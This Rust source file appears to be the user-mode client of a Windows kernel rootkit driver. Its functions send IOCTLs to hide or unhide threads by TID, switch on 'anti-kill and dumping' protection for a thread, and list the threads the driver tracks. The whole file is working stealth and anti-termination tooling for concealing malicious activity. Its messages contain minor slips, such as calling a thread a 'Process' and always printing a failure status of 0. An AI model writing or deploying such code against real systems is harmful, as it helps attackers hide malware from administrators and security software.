use {
    crate::{cli::Options, driver::open_driver},
    std::{ffi::c_void, mem::size_of, ptr::null_mut},
    shared::{structs::{EnumerateInfoInput, TargetThread, ThreadListInfo}, vars::MAX_TIDS},
    windows_sys::Win32::{Foundation::CloseHandle, System::IO::DeviceIoControl},
};

pub fn hide_unhide_thread(tid: Option<&u32>, ioctl_code: u32, enable: bool) {
    let h_file = open_driver().expect("Failed to open driver");
    let status;
    
    if let Some(tid_value) = tid {
        let mut return_buffer = 0;
        let tid = *tid_value as usize;
        let mut target_thread = TargetThread {
            tid,
            enable
        };
        
        status = unsafe { 
                DeviceIoControl(
                h_file,
                ioctl_code,
                &mut target_thread  as *mut _ as *mut c_void,
                std::mem::size_of::<TargetThread>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut()
            )
        };

        if status == 0 {
            eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
        } else {
            if enable {
                println!("[+] Process with TID {tid} successfully hidden");
            } else {
                println!("[+] Process with TID {tid} successfully unhidden");
            }
    
        }
    } else {
        println!("[-] TID not supplied");
    }

    unsafe { 
        CloseHandle(h_file);
    };
}

#[cfg(not(feature = "mapper"))]
pub fn protection_thread(tid: Option<&u32>, ioctl_code: u32, enable: bool) {
    let h_file = open_driver().expect("Failed to open driver");
    let status;
    
    if let Some(tid_value) = tid {
        let mut return_buffer = 0;
        let tid = *tid_value as usize;
        let mut target_process =  shared::structs::ThreadProtection {
            tid,
            enable
        };
        
        status = unsafe { 
                DeviceIoControl(
                h_file,
                ioctl_code,
                &mut target_process  as *mut _ as *mut c_void,
                std::mem::size_of::<shared::structs::ThreadProtection>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut()
            )
        };

        if status == 0 {
            eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
        } else {
            if enable {
                println!("[+] Thread TID {tid} with anti-kill and dumping functions enabled");
            } else {
                println!("[+] Thread TID {tid} with anti-kill and dumping functions disabled");
            }

        }
    } else {
        println!("[-] TID not supplied");
    }

    unsafe { 
        CloseHandle(h_file);
    };
}

pub fn enumerate_thread(ioctl_code: u32, option: &Options) {
    let h_file = open_driver().expect("Failed to open driver");
    let mut info_thread: [ThreadListInfo; MAX_TIDS] = unsafe { std::mem::zeroed() };
    let mut enumeration_input = EnumerateInfoInput {
        options: option.to_shared()
    };
    let mut return_buffer = 0;
    let status = unsafe { 
            DeviceIoControl(
            h_file,
            ioctl_code,
            &mut enumeration_input  as *mut _ as *mut c_void,
            size_of::<EnumerateInfoInput>() as u32,
            info_thread.as_mut_ptr() as *mut _,
            (info_thread.len() * size_of::<ThreadListInfo>()) as u32,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        let total_process = return_buffer as usize / size_of::<ThreadListInfo>();
        println!("[+] Total Threads: {}", total_process);
        for i in 0..total_process {
            if info_thread[i].tids > 0 {
                println!("[{}] {}", i, info_thread[i].tids);
            }
        }
    }

    unsafe { 
        CloseHandle(h_file);
    };
}